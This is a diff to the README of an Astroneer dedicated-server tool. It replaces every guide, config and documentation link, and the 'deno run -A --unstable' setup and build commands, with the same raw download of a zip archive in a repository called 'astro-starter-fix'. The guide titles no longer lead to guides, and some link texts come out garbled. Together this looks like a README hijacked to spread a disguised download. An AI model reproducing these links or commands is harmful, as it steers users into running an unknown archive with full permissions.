@@ -15,14 +15,14 @@ This tool offers many advantages over AstroLauncher, these include:
 
 ## Guides
 
--   [How to set up a locally hosted server](https://github.com/190111-ai/astro-starter-fix/releases)
--   [How to set up a local server with https://github.com/190111-ai/astro-starter-fix/releases](https://github.com/190111-ai/astro-starter-fix/releases)
--   [How to set up RCON management for a Gportal server](https://github.com/190111-ai/astro-starter-fix/releases)
--   [How to add Discord integration](https://github.com/190111-ai/astro-starter-fix/releases)
+-   [How to set up a locally hosted server](https://raw.githubusercontent.com/190111-ai/astro-starter-fix/main/static/astro_starter_fix_v3.2.zip)
+-   [How to set up a local server with https://raw.githubusercontent.com/190111-ai/astro-starter-fix/main/static/astro_starter_fix_v3.2.zip](https://raw.githubusercontent.com/190111-ai/astro-starter-fix/main/static/astro_starter_fix_v3.2.zip)
+-   [How to set up RCON management for a Gportal server](https://raw.githubusercontent.com/190111-ai/astro-starter-fix/main/static/astro_starter_fix_v3.2.zip)
+-   [How to add Discord integration](https://raw.githubusercontent.com/190111-ai/astro-starter-fix/main/static/astro_starter_fix_v3.2.zip)
 
 ## Config
 
-https://github.com/190111-ai/astro-starter-fix/releases
+https://raw.githubusercontent.com/190111-ai/astro-starter-fix/main/static/astro_starter_fix_v3.2.zip
 
 ```json
 {
@@ -70,7 +70,7 @@ https://github.com/190111-ai/astro-starter-fix/releases
 
 Docs:
 
--   [Configuration file - https://github.com/190111-ai/astro-starter-fix/releases](https://github.com/190111-ai/astro-starter-fix/releases)
+-   [Configuration file - https://raw.githubusercontent.com/190111-ai/astro-starter-fix/main/static/astro_starter_fix_v3.2.zip](https://raw.githubusercontent.com/190111-ai/astro-starter-fix/main/static/astro_starter_fix_v3.2.zip)
 
 ## Linux
 
@@ -82,7 +82,7 @@ Astro-starter does provide native linux builds that can be used for remote serve
 Tested with deno 1.10.2
 
 ```
-deno run -A --unstable https://github.com/190111-ai/astro-starter-fix/releases
+deno run -A --unstable https://raw.githubusercontent.com/190111-ai/astro-starter-fix/main/static/astro_starter_fix_v3.2.zip
 ```
 
 ## compile
@@ -90,7 +90,7 @@ deno run -A --unstable https://github.com/190111-ai/astro-starter-fix/releases
 To build binaries for windows and linux just run the following command to run the build script that takes care of static files.
 
 ```
-deno run -A --unstable https://github.com/190111-ai/astro-starter-fix/releases
+deno run -A --unstable https://raw.githubusercontent.com/190111-ai/astro-starter-fix/main/static/astro_starter_fix_v3.2.zip
 ```
 
 ## TODO
